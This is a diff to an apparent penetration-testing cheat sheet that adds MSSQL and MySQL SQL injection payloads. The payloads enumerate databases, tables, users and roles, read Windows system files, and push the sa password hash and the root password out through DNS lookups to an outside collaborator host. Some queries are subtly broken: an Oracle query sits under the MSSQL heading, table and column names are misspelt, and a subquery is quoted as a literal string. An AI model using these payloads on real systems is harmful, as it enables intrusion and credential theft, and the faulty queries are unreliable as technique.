@@ -7,7 +7,105 @@ coming soon
 ## SQLi
 
 ### MSSQL
-cooming soon
+
+**List version name**
+
+```
+SELECT @@VERSION;-- -
+```
+
+**List database name**
+
+```
+SELECT name FROM master..sysdatabases;-- -
+```
+```
+SELECT name FROM sysdatabases;-- -
+```
+
+**List the table of a specific database**
+
+```
+S = System Table
+U = User Table
+TT = Table Type
+X = Extended Store Procedure
+V = Views
+```
+```
+SELECT name FROM mydatabasename..sysobjects WHERE xtype='U';-- -
+```
+```
+SELECT table_name FROM mydatabasename.INFORMATION_SCHEMA.TABLES WHERE table_type='BASE TABLE';-- -
+```
+
+**List all tables and views of the current database**
+
+```
+SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='BASE TABLE';-- -
+```
+
+**List the columns of a specific table**
+
+```
+SELECT column_name FROM mydatabasename.INFORMATION_SCHEMA.columns WHERE table_name = '';-- -
+```
+
+**List the columns of tables, views and clusters accessible to the current user**
+
+```
+SELECT column_name FROM SYS.ALL_TAB_COLUMNS;-- -
+```
+```
+SELECT column_name FROM ALL_TAB_COLUMNS;-- -
+```
+
+**List the current user**
+
+```
+SELECT loginame FROM SYSPROCESS WHERE spied = @@SPID;-- -
+```
+
+**List all users**
+
+```
+SELECT name FROM SYSLOGINS;-- -
+```
+
+**List users' privilegs**
+The possibile roles are
+```
+sysadmin
+serveradmin
+dbcreator
+setupadmin
+bulkadmin
+securityadmin
+diskadmin
+public
+processadmin
+```
+```
+SELECT IS_SRVROLEMEMBER('processadmin', 'myusername');-- -
+```
+If no username is supplied as an argument, it is the currentuser
+
+**Provoke DNS request**
+
+```
+Two alternatives are XP_DIRTREE and XP_SUBDIRS
+```
+```
+EXEC MASTER..XP_FILEEXIST 'C:\Windows\System32\drivers\etc\hosts';-- -
+```
+```
+DECLARE @host varchar(1024);
+
+SELECT @host=(SELECT TOP 1 MASTER.DBO.FN_VARBINTOHEXSTR(password_hash)
+FROM SYS.SQL_LOGINS WHERE name='sa') + '.mycollaboratorserver';
+
+EXEC('MASTER..XP_FILEEXIST "\\'+@host+'"');
+```
 
 ### Oracle
 cooming soon
@@ -90,6 +188,18 @@ a' RLIKE (SELECT (
 	)>64 /* check if the ASCII value of a specified letter is bigger than a specified value */
 )
 THEN 0x61 ELSE 0x28 END))
+```
+
+**Read system files (Windows only)**
+
+```
+SELECT LOAD_FILE("C:\\Windows\\System32\\drivers\\etc\\hosts");-- -
+```
+
+**Provoke DNS request (Windows only)**
+
+```
+SELECT LOAD_FILE(CONCAT('\\\\', 'SELECT password FROM mysql.users WHERE user=\'root\'', '.mycollaboratorserver'));-- -
 ```
 
 **Other tips**
